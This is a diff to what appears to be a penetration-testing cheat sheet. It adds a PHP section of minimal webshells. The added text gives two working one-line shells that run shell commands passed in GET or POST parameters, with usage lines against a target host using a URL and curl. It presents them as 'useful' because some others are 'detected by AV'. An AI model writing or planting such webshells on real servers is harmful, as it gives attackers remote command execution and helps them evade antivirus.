@@ -93,3 +93,22 @@ WScript.StdOut.Write(strOutput)
 WScript.Echo(strOutput)
 %>
 ```
+# PHP
+
+The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones.
+
+* https://github.com/bayufedra/Tiny-PHP-Webshell
+
+```
+<?=`$_GET[0]`?>
+
+Usage :
+  http://target.com/path/to/shell.php?0=command
+```
+
+```
+<?=`$_POST[0]`?>
+
+Usage :
+  curl -X POST http://target.com/path/to/shell.php -d "0=command"
+```
